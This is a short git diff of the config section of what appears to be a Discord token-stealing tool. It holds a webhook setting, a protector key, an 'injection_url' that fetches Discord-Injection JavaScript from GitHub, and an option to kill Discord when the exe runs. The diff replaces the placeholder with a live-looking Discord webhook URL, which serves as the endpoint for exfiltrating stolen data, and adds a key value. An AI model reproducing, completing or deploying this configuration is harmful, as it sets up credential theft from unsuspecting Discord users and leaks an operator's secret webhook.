@@ -33,9 +33,9 @@ from Crypto.Util.number import long_to_bytes
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/1388769336902025288/SWdr6Qc5f-I2-GmGvMeRmGwODHVWrdZufpwlPIaHKj3aSd4cPr-G6tNKAq5wb56Up9KF",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
-    'webhook_protector_key': "KEY_HERE",
+    'webhook_protector_key': "poop51",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
